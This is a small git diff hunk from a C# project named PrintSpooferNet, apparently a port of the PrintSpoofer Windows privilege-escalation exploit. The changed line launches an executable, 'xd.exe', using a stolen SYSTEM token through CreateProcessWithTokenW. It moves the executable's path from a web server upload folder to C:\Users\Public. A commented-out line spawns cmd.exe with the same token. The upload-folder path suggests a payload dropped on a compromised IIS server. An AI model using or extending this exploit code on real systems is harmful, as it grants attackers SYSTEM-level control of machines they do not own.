@@ -174,7 +174,7 @@ namespace PrintSpooferNet
 
             /*CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);*/
 
-            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\xd.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Users\\Public\\xd.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
         }
 
     }
